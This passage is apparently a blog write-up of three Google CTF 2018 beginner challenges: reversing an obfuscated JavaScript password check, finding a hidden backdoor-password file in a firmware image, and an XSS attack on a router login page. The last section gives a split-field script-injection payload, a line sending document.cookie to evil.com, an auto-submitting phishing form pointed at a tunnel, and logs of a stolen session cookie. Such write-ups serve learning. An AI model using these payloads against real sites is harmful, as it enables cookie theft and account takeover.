  transform: rotateY(270deg) translateX(-100px);
  transform-origin: center left;
}
.top {
  transform: rotateX(-90deg) translateY(-100px);
  transform-origin: top center;
}
.bottom {
  transform: rotateX(90deg) translateY(100px);
  transform-origin: bottom center;
}
.front {
  transform: translateZ(100px);
}
@keyframes spin {
  from { transform: rotateY(0); }
  to { transform: rotateY(360deg); }
}
.cube {
  animation: spin 20s infinite linear;
}
.cube div {
  position: absolute;
  width: 200px;
  height: 200px;
  background: rgba(0, 0, 0, 0.51);
  box-shadow: inset 0 0 60px white;
  font-size: 20px;
  text-align: center;
  line-height: 200px;
  color: rgba(0,0,0,0.5);
  font-family: sans-serif;
  text-transform: uppercase;
}
</style>
<script>
async function x(password) {
    // TODO: check if they can just use Google to get the password once they understand how this works.
    var code = 'icffjcifkciilckfmckincmfockkpcofqcoircqfscoktcsfucsivcufwcooxcwfycwiAcyfBcwkCcBfDcBiEcDfFcwoGcFfHcFiIcHfJcFkKcJfLcJiMcLfNcwwOcNNPcOOQcPORcQNScRkTcSiUcONVcUoWcOwXcWkYcVkЀcYiЁcЀfЂcQoЃcЂkЄcЃfЅcPNІcЅwЇcІoЈcЇiЉcЈfЊcPkЋcЊiЌcІiЍcЌfЎcWoЏcЎkАcЏiБcІkВcБfГcNkДcГfЕcЇkЖcЕiЗcЖfИcRwЙcИoКcЙkЛcUkМcЛiНcМfОcИkПcОiРcПfСcUwТcСiУcQkФcУiХcЃiЦcQwЧcЦoШcЧkЩcШiЪcЩfЫcRiЬcЫfЭcКiЮcЭfЯcСoаcЯiбcГiвcЙiгcRoдcгkеcдiжdТaзcЛfиdзaжcжийcСkкdйaжcжклcйfмdлaжcжмнdТaжcжноdЀaжcжопdNaжcжпрcUiсcрfтdсaуdЁaтcтутcтофcТfхdфaтcтхтcтктcтнтcтмцdсaтcтцтcтктcтутcтнчaaтшdЯaщcйiъcщfыdъaьcжыэcVfюdэaьcьюьcьояdЛaьcьяьcьуьcьыѐчшьёѐшшђcOfѓdђaѓcѓнѓcѓнєcUfѕdєaѓcѓѕіcЯfїdіaѓcѓїјaёѓљaaтњcжшћcЎiќcћfѝdќaњcњѝњcњeўcЏfџdўaњcњџѠdАaњcњѠњcњшњcњѝњcњfњcњџѡљшњѢaaтѣcжшѣcѣѝѣcѣeѣcѣџѤcЯkѥdѤaѣcѣѥѣcѣшѣcѣѝѣcѣfѣcѣџѦѢшѣѧcцнѧcѧїѨdСaѧcѧѨѧcѧкѧcѧуѩaёѧѪcхмѫdрaѪcѪѫѪcѪкѬdYaѪcѪѬѪcѪиѭaѩѪѮcяюѯdНaѮcѮѯѮcѮиѮcѮхѮcѮкѰaѭѮѱdVaѲcхѱѲcѲѕѳcNoѴcѳkѵcѴfѶdѵaѲcѲѶѲcѲiѲcѲlѲcѲmѷјѲgѸјѭѷѹbѰѸѺcXfѻdѺaѻcѻюѻcѻоѻcѻкѻcѻoѼdђaѻcѻѼѻcѻнѻcѻнѻcѻѕѻcѻїѽaёѻѾѽѹшѿceeҀceeҁcee҂ceeѿaѾeҀјѿT҂ѡҀшҁјh҂hѦҁшѿaѾfҀјѿV҂ѡҀшҁјh҂hѦҁшѿaѾiҀјѿU҂ѡҀшҁјh҂hѦҁшѿaѾjҀјѿX҂ѡҀшҁјh҂hѦҁшѿaѾkҀјѿЁ҂ѡҀшҁјh҂hѦҁшѿaѾlҀјѿF҂ѡҀшҁјh҂hѦҁшѿaѾmҀјѿЄ҂ѡҀшҁјh҂hѦҁшѿaѾnҀјѿЉ҂ѡҀшҁјh҂hѦҁшѿaѾoҀјѿЄ҂ѡҀшҁјh҂hѦҁшѿaѾpҀјѿЋ҂ѡҀшҁјh҂hѦҁшѿaѾqҀјѿЍ҂ѡҀшҁјh҂hѦҁшѿaѾrҀјѿА҂ѡҀшҁјh҂hѦҁшѿaѾsҀјѿF҂ѡҀшҁјh҂hѦҁшѿaѾtҀјѿВ҂ѡҀшҁјh҂hѦҁшѿaѾuҀјѿД҂ѡҀшҁјh҂hѦҁшѿaѾvҀјѿЗ҂ѡҀшҁјh҂hѦҁшѿaѾwҀјѿК҂ѡҀшҁјh҂hѦҁшѿaѾxҀјѿН҂ѡҀшҁјh҂hѦҁшѿaѾyҀјѿР҂ѡҀшҁјh҂hѦҁшѿaѾAҀјѿТ҂ѡҀшҁјh҂hѦҁшѿaѾBҀјѿФ҂ѡҀшҁјh҂hѦҁшѿaѾCҀјѿW҂ѡҀшҁјh҂hѦҁшѿaѾDҀјѿХ҂ѡҀшҁјh҂hѦҁшѿaѾEҀјѿЪ҂ѡҀшҁјh҂hѦҁшѿaѾFҀјѿЬ҂ѡҀшҁјh҂hѦҁшѿaѾGҀјѿЮ҂ѡҀшҁјh҂hѦҁшѿaѾHҀјѿа҂ѡҀшҁјh҂hѦҁшѿaѾIҀјѿe҂ѡҀшҁјh҂hѦҁшѿaѾJҀјѿб҂ѡҀшҁјh҂hѦҁшѿaѾKҀјѿв҂ѡҀшҁјh҂hѦҁшѿaѾLҀјѿK҂ѡҀшҁјh҂hѦҁшѿaѾMҀјѿе҂ѡҀшҁјh҂hѦҁшѐceeёceeѓceeјceeљceeњceeѡceeѢceeѣceeѦceeѧceeѩceeѪceeѭceeѮceeѰceeѲceeѷceeѸceeѹceeѻceeѽceeѾceeҀceeҁceeжceeтceeчceeьcee'
    var env = {
        a: (x,y) => x[y],
        b: (x,y) => Function.constructor.apply.apply(x, y),
        c: (x,y) => x+y,
        d: (x) => String.fromCharCode(x),
        e: 0,
        f: 1,
        g: new TextEncoder().encode(password),
        h: 0,
    };
    for (var i = 0; i < code.length; i += 4) {
        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
        try {
            env[lhs] = env[fn](env[arg1], env[arg2]);
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
        }
        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
    }
    return !env.h;
}
</script>
<script>
const alg = { name: 'AES-CBC', iv: Uint8Array.from([211,42,178,197,55,212,108,85,255,21,132,210,209,137,37,24])};
const secret = Uint8Array.from([26,151,171,117,143,168,228,24,197,212,192,15,242,175,113,59,102,57,120,172,50,64,201,73,39,92,100,64,172,223,46,189,65,120,223,15,34,96,132,7,53,63,227,157,15,37,126,106]);
async function open_safe() {
  keyhole.disabled = true;
  password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
  if (!password || !(await x(password[1]))) return document.body.className = 'denied';
  document.body.className = 'granted';
  const pwHash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(password[1])); 
  const key = await crypto.subtle.importKey('raw', pwHash, alg, false, ['decrypt']);
  content.value = new TextDecoder("utf-8").decode(await crypto.subtle.decrypt(alg, key, secret))
}
</script>
</head>
<body>
<div>
  <input id="keyhole" autofocus onchange="open_safe()" placeholder="🔑">
</div>
<div class="wrap">
  <div class="cube">
    <div class="front"></div>
    <div class="back"></div>
    <div class="top"></div>
    <div class="bottom"></div>
    <div class="left"></div>
    <div class="right"></div>
  </div>
</div>
<div id="result">
</div>
<div>
  <input id="content">
</div>
</body>
</html>
```

In the <b>open_safe()</b> function, we can gather that the password is expected to have a format of CTF{some_value} just like our previous flags. If the password is not valid, or the function <b>x()</b>, given some_value (which we discover later) as an argument returns false, we will get the denied message.

```js
password = /^CTF{([0-9a-zA-Z_@!?-]+)}$/.exec(keyhole.value);
if (!password || !(await x(password[1]))) return document.body.className = 'denied';
```

From the function <b>x()</b>, we will see that <b>env</b> stores a dictionary that maps <b>env.g</b> to an array returning the decimal equivalent of whatever we pass into <b>some_vaue</b>. For example, CTF{aaaa} would result in <code>Uint8Array(4) [97, 97, 97, 97]</code>.

```js
var env = {
    a: (x,y) => x[y],
    b: (x,y) => Function.constructor.apply.apply(x, y),
    c: (x,y) => x+y,
    d: (x) => String.fromCharCode(x),
    e: 0,
    f: 1,
    g: new TextEncoder().encode(password),
    h: 0,
};
```

The function contains a for loop that runs through the <b>code</b> variable four characters at a time and assigns them to local variables within the function. <b>arg1</b> and <b>arg2</b> represent arguments passed into the <b>fn</b> function. The result of <b>fn</b> is stored in <b>lhs</b>. Following each <b>fn</b> call after every iteraction of the for loop will a lot of time, but it's possible that the value in <b>env.h</b> will give us a hint as to which iterations to look at. We can print the <b>env</b> values and specifically, <b>env.h</b>, like so:

```js
for (var i = 0; i < code.length; i += 4) {
        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
        try {
            env[lhs] = env[fn](env[arg1], env[arg2]);
            console.log(env);
            console.log("lhs: ", lhs, " fn: ", fn, " arg1: ", arg1, " arg2: ", arg2);
            console.log("env[lhs]: ", env[lhs], " env[fn]: ", env[fn], " env[arg1]: ", env[arg1], " env[arg2]: ", env[arg2]);
            console.log("env.h: ", env.h)
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
        }
        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
    }
    return !env.h;
```

If we reload the html document and check the console, we get a lot of output. However, there are a few values that catch the eye. Throughout the for loop, but not necessarily evident in the output below, the <b>env[arg2]</b> is feeding characters to <b>env[arg1]</b>. At certain points within the loop, the <b>env</b> values give us strong hints for what might be happening behind the scenes.

```
lhs:  њ  fn:  c  arg1:  њ  arg2:  џ
js_safe_1.html:120 env[lhs]:  return x[0]^x[1]  env[fn]:  (x,y) => x+y  env[arg1]:  return x[0]^x[1]  env[arg2]:  ]
env.h:  0
```

```
lhs:  ѣ  fn:  c  arg1:  ѣ  arg2:  џ
js_safe_1.html:120 env[lhs]:  return x[0]|x[1]  env[fn]:  (x,y) => x+y  env[arg1]:  return x[0]|x[1]  env[arg2]:  ]
env.h:  0
```

```
lhs:  ѷ  fn:  ј  arg1:  Ѳ  arg2:  g
env[lhs]:  (2) ["sha-256", Uint8Array(4)]  env[fn]:  ƒ Array() { [native code] }  env[arg1]:  sha-256  env[arg2]:  Uint8Array(4) [97, 97, 97, 97]
env.h:  0

lhs:  Ѹ  fn:  ј  arg1:  ѭ  arg2:  ѷ
env[lhs]:  (2) [SubtleCrypto, Array(2)]  env[fn]:  ƒ Array() { [native code] }  env[arg1]:  SubtleCrypto {}  env[arg2]:  (2) ["sha-256", Uint8Array(4)]
env.h:  0

lhs:  ѹ  fn:  b  arg1:  Ѱ  arg2:  Ѹ
env[lhs]:  Promise {<pending>}  env[fn]:  (x,y) => Function.constructor.apply.apply(x, y)  env[arg1]:  ƒ digest() { [native code] }  env[arg2]:  (2) [SubtleCrypto, Array(2)]
env.h:  0
```

It seems like some_value that we entered as part of our flag in the password field might be hashed using sha-256. At some point, we have an array stored in <b>env[arg1]</b>.

```
lhs:  ѿ  fn:  a  arg1:  Ѿ  arg2:  e
env[lhs]:  97  env[fn]:  (x,y) => x[y]  env[arg1]:  Uint8Array(32) [97, 190, 85, 168, 226, 246, 180, 225, 114, 51, 139, 221, 241, 132, 214, 219, 238, 41, 201, 136, 83, 224, 160, 72, 94, 206, 231, 242, 123, 154, 240, 180]  env[arg2]:  0
env.h:  0
```

Using some quick Python magic, printing the hex equivalent of the decimal values gives us a sha-256 hash. We can cross reference this with the sha-256 hash of <b>"aaaa"</b> which turns out to be identical. This confirms that the value stored in the array is really just the text in some_value.

```py
print str(bytearray([97, 190, 85, 168, 226, 246, 180, 225, 114, 51, 139, 221, 241, 132, 214, 219, 238, 41, 201, 136, 83, 224, 160, 72, 94, 206, 231, 242, 123, 154, 240, 180])).encode('hex')
61be55a8e2f6b4e172338bddf184d6dbee29c98853e0a0485ecee7f27b9af0b4
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/41.png" alt="" class="center">

Further down our loop, we notice that our decimal values are being compared to presumably, decimal values from another array. 

```js
lhs:  Ҁ  fn:  ј  arg1:  ѿ  arg2:  T
js_safe_1.html:120 env[lhs]:  (2) [97, 230]  env[fn]:  ƒ Array() { [native code] }  env[arg1]:  97  env[arg2]:  230
env.h:  0

lhs:  Ҁ  fn:  ј  arg1:  ѿ  arg2:  V
js_safe_1.html:120 env[lhs]:  (2) [190, 104]  env[fn]:  ƒ Array() { [native code] }  env[arg1]:  190  env[arg2]:  104
env.h:  135

lhs:  Ҁ  fn:  ј  arg1:  ѿ  arg2:  U
js_safe_1.html:120 env[lhs]:  (2) [85, 96]  env[fn]:  ƒ Array() { [native code] }  env[arg1]:  85  env[arg2]:  96
env.h:  215

.
.
.
```

If we observe the values carefully, we'll notice that whenever fn <b>ј</b> is comparing values from our array to values from a different array, <b>arg1</b> always maps to <b>ѿ</b>. We can check the contents of <b>env[arg2]</b> whenever <b>arg1</b> maps to <b>ѿ</b> by pushing <b>env[arg2]</b> into an array and printing the array after the loop has terminated.

```js
arg2_array = [];
for (var i = 0; i < code.length; i += 4) {
        var [lhs, fn, arg1, arg2] = code.substr(i, 4);
        try {
            env[lhs] = env[fn](env[arg1], env[arg2]);
            console.log(env);
            console.log("lhs: ", lhs, " fn: ", fn, " arg1: ", arg1, " arg2: ", arg2);
            console.log("env[lhs]: ", env[lhs], " env[fn]: ", env[fn], " env[arg1]: ", env[arg1], " env[arg2]: ", env[arg2]);
            console.log("env.h: ", env.h)
            if (arg1 == "ѿ") {arg2_array.push(env[arg2])};
        } catch(e) {
            env[lhs] = new env[fn](env[arg1], env[arg2]);
        }
        if (env[lhs] instanceof Promise) env[lhs] = await env[lhs];
    }
    console.log(arg2_array);
    return !env.h;
```

The code prints the following array to console:

```
[230, 104, 96, 84, 111, 24, 205, 187, 205, 134, 179, 94, 24, 181, 37, 191, 252, 103, 247, 114, 198, 80, 206, 223, 227, 255, 122, 0, 38, 250, 29, 238]
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/42.png" alt="" class="center">

Once again, we can use python to print the sha-256 hash of the decimal values in the array. Running this hash through a sha-256 decrypter generates the text that we need to place in the brackets of our flag: <b>Passw0rd!</b>.

```py
>>> print str(bytearray([230, 104, 96, 84, 111, 24, 205, 187, 205, 134, 179, 94, 24, 181, 37, 191, 252, 103, 247, 114, 198, 80, 206, 223, 227, 255, 122, 0, 38, 250, 29, 238])).encode('hex')
e66860546f18cdbbcd86b35e18b525bffc67f772c650cedfe3ff7a0026fa1dee
```

The flag can be validated in the html password field, revealing a link to a Web Management Interface login form, as well as the JS Safe challenge flag field.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/43.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/44.png" alt="" class="center">
<br>
<br>
<b>http://router-ui.web.ctfcompetition.com</b><br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/45.png" alt="" class="center">
<br>
<br>
### Solution
<b>CTF{Passw0rd!}</b>

<br>
<br>
## Firmware - re

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/46.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/47.png" alt="" class="center">

This time, our challenge prompt clues us in to using <code>binwalk</code> on the binary that we download. When we extract the zip folder, we get an ext4 filesystem. 


```bash
root@kali:~/google-ctf-2018/firmware# unzip 9522120f36028c8ab86a37394903b100ce90b81830cee9357113c54fd3fc84bf.zip 
Archive:  9522120f36028c8ab86a37394903b100ce90b81830cee9357113c54fd3fc84bf.zip
 extracting: challenge.ext4.gz

root@kali:~/google-ctf-2018/firmware# gunzip challenge.ext4.gz

root@kali:~/google-ctf-2018/firmware# file challenge.ext4 
challenge.ext4: Linux rev 1.0 ext4 filesystem data, UUID=00ed61e1-1230-4818-bffa-305e19e53758 (extents) (64bit) (large files) (huge files)

root@kali:~/google-ctf-2018/firmware# binwalk challenge.ext4 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=00ed61e1-1230-4818-bffa-305e19e519e5
302760        0x49EA8         Unix path: /proc/self/fd/0
302888        0x49F28         Unix path: /proc/self/fd/1
303016        0x49FA8         Unix path: /proc/self/fd/2
804522        0xC46AA         Unix path: /../../America/Jujuy
1061416       0x103228        Unix path: /lib/systemd/system/sound.target
4734711       0x483EF7        GPG key trust database version 118
4737795       0x484B03        GPG key trust database version 115
4738863       0x484F2F        GPG key trust database version 45
4740795       0x4856BB        GPG key trust database version 46
4995639       0x4C3A37        GPG key trust database version 45
4996927       0x4C3F3F        GPG key trust database version 0
4998963       0x4C4733        GPG key trust database version 115
4999759       0x4C4A4F        GPG key trust database version 118
5001479       0x4C5107        GPG key trust database version 0
5061715       0x4D3C53        GPG key trust database version 118
5062687       0x4D401F        GPG key trust database version 107
5062707       0x4D4033        GPG key trust database version 107
5062727       0x4D4047        GPG key trust database version 107
5062751       0x4D405F        GPG key trust database version 107
5062771       0x4D4073        GPG key trust database version 107
8388608       0x800000        Linux EXT filesystem, rev 1.0, ext4 filesystem data, UUID=00ed61e1-1230-4818-bffa-305e19e519e5
8655872       0x841400        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
8854057       0x871A29        Unix path: /run/systemd/journal/socket
8859328       0x872EC0        Unix path: /src/udev/net/link-config.c
8873634       0x8766A2        Unix path: /src/libsystemd/sd-rtnl/sd-rtnl.c
8876850       0x877332        Unix path: /src/libsystemd/sd-daemon/sd-daemon.c
8881186       0x878422        Unix path: /src/udev/net/ethtool-util.c
8958976       0x88B400        ELF, 64-bit LSB shared object, AMD x86-64, version 1 (SYSV)
.
.
.
```

When we use <code>binwalk</code> on the filesystem, the command begins to spit out all the files within <b>challenge.ext4</b>. Rather than wait for <code>binwalk</code> to discover every file within the filesystem and print them to console, we can mount the filesystem directly to a temporary directory and see if we can find something interesting ourselves.

```bash
root@kali:~/google-ctf-2018/firmware# mkdir /tmp/firmware

root@kali:~/google-ctf-2018/firmware# mount challenge.ext4 /tmp/firmware

root@kali:~/google-ctf-2018/firmware# cd /tmp/firmware

root@kali:/tmp/firmware# ls -la
total 44
drwxr-xr-x 22 root root  1024 Jun 22  2018 .
drwxrwxrwt 18 root root  4096 Jan 10 16:45 ..
-rw-r--r--  1 root root    40 Jun 22  2018 .mediapc_backdoor_password.gz
drwxr-xr-x  2 root root  3072 Jun 22  2018 bin
drwxr-xr-x  2 root root  1024 Jun 22  2018 boot
drwxr-xr-x  4 root root  1024 Jun 22  2018 dev
drwxr-xr-x 52 root root  4096 Jun 22  2018 etc
drwxr-xr-x  2 root root  1024 Jun 22  2018 home
drwxr-xr-x 12 root root  1024 Jun 22  2018 lib
drwxr-xr-x  2 root root  1024 Jun 22  2018 lib64
drwx------  2 root root 12288 Jun 22  2018 lost+found
drwxr-xr-x  2 root root  1024 Jun 22  2018 media
drwxr-xr-x  2 root root  1024 Jun 22  2018 mnt
drwxr-xr-x  2 root root  1024 Jun 22  2018 opt
drwxr-xr-x  2 root root  1024 Jun 22  2018 proc
drwx------  2 root root  1024 Jun 22  2018 root
drwxr-xr-x  4 root root  1024 Jun 22  2018 run
drwxr-xr-x  2 root root  3072 Jun 22  2018 sbin
drwxr-xr-x  2 root root  1024 Jun 22  2018 srv
drwxr-xr-x  2 root root  1024 Jun 22  2018 sys
drwxr-xr-x  2 root root  1024 Jun 22  2018 tmp
drwxr-xr-x 10 root root  1024 Jun 22  2018 usr
drwxr-xr-x  9 root root  1024 Jun 22  2018 var


```

Directly within the root directory, we find a hidden gzip file with a suspicious name. When we investigate the contents of the hidden file, we'll find the flag waiting for us inside.

```bash
root@kali:/tmp/firmware# cp .mediapc_backdoor_password.gz /root/google-ctf-2018/firmware/

root@kali:/tmp/firmware# cd /root/google-ctf-2018/firmware/

root@kali:~/google-ctf-2018/firmware# gunzip .mediapc_backdoor_password.gz 

root@kali:~/google-ctf-2018/firmware# ls -la
total 390472
drwxr-xr-x 2 root root      4096 Jan 10 16:46 .
drwxr-xr-x 9 root root      4096 Jan 10 15:25 ..
-rw-r--r-- 1 root root        20 Jan 10 16:46 .mediapc_backdoor_password
-rw-r--r-- 1 root root  85258049 Jan 10 15:25 9522120f36028c8ab86a37394903b100ce90b81830cee9357113c54fd3fc84bf.zip
-rw-r--r-- 1 root root 314572800 Jan 10 16:46 challenge.ext4

root@kali:~/google-ctf-2018/firmware# cat .mediapc_backdoor_password 
CTF{I_kn0W_tH15_Fs}
```
<br>
<br>
### Solution
<b>CTF{I_kn0W_tH15_Fs}</b>

<br>
<br>
## Router-UI - web

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/48.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/49.png" alt="" class="center">

The challenge prompt tells us to exploit an XSS vulnerability in the login portal. Let's see what we can deduce from some test credentials first. 

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/50.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/51.png" alt="" class="center">

We notice that the html spits out the entered credentials using two backslashes, "//", as a delimiter. Testing for XSS, we use some &lt;script&gt; tags, but get the error message: <b>"ERR_BLOCKED_BY_XSS_AUDITOR"</b>.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/52.png" alt="" class="center">
<br>
<br>
<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/53.png" alt="" class="center">

Leveraging the "//" delimiter found earlier, we can split our XSS attack between the username and password fields by entering the following credentials:
```
username: <script src="http:
password: evil.com/something.js"></script>
```

This will force the document to generate the following html source:

```
Wrong credentials: <script src="http://evil.com/something.js"></script>
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/54.png" alt="" class="center">

The "//" delimiter concatenates the username and password fields and joins our script tags together.

In order to exploit this vulnerability and steal the root user's cookies, we'll need to create a form for <b>http://router-ui.web.ctfcompetition.com</b> that will automatically submit our XSS redirection in the username and password fields. Forcing a user to click on a link with this form should trigger the XSS and execute our hosted JavaScript file. In the JavaScript file, we'll force the user to expose their cookie by appending it to a GET request on our server.

<b>evil.js</b>
```js
window.location.href="https://evil.com/log.php?"+document.cookie;
```

To prepare for the attack, we can spin up a SimpleHTTPServer with Python and temporarily expose our local web server with <a href="https://serveo.net/" target="_blank">Serveo</a>.

```
root@kali:~/google-ctf-2018/router-ui# python -m SimpleHTTPServer 80

root@kali:~/google-ctf-2018# ssh -R 80:localhost:80 serveo.net
```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/55.png" alt="" class="center">

The final task is to email our malicious form via a link to the root user, wintermuted@googlegroups.com. The link will contain the following html:

<b>index.html</b>
```html
<html>
  <body>
    <form action="https://router-ui.web.ctfcompetition.com/login" method="post">
      <input type="text" name="username" value="<script src='https:">
      <input type="password" name="password" value="xxxxx.serveo.net/'></script>">
      <button type="submit">Submit</button>
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

Not long after sending the email, we receive a request for our link. The link forces wintermuted to submit the form with our XSS redirection injected in the fields. We see the request for <b>evil.js</b> which triggers another request for <b>log.php</b> and appends a cookie to the end of the URL.

```bash
root@kali:~/google-ctf-2018/router-ui# ssh -R 80:localhost:80 serveo.net
Hi there
Forwarding HTTP traffic from https://xxxxx.serveo.net
Press g to start a GUI session and ctrl-c to quit.
HTTP request from 35.233.114.180 to https://xxxxx.serveo.net/
HTTP request from 35.233.114.180 to https://xxxxx.serveo.net/evil.js
HTTP request from 35.233.114.180 to https://xxxxx.serveo.net/log.php?flag=Try%20the%20session%20cookie;%20session=Avaev8thDieM6Quauoh2TuDeaez9Weja
```

Our Python SimpleHTTPServer mirrors Serveo's logs. 

```bash
root@kali:~/google-ctf-2018/router-ui# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
127.0.0.1 - - [12/Jan/2019 14:35:52] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [12/Jan/2019 14:35:53] "GET /evil.js HTTP/1.1" 200 -
127.0.0.1 - - [12/Jan/2019 14:35:53] code 404, message File not found
127.0.0.1 - - [12/Jan/2019 14:35:53] "GET /log.php?flag=Try%20the%20session%20cookie;%20session=Avaev8thDieM6Quauoh2TuDeaez9Weja HTTP/1.1" 404 -

```

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/56.png" alt="" class="center">

If we change the document cookies via JavaScript and reload <b>https://router-ui.web.ctfcompetition.com/</b>, the server will return an authenticated session.

```js
document.cookie = "session=Avaev8thDieM6Quauoh2TuDeaez9Weja"
```

Within the management console, we will find credentials that can be exposed by viewing the page source. The credentials happen to contain the flag for this challenge.

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/57.png" alt="" class="center">

<img src="/assets/images/ctfs/google-ctf-beginners-quest-2018/58.png" alt="" class="center">


<br>
<br>
### Solution
<b>CTF{Kao4pheitot7Ahmu}</b>
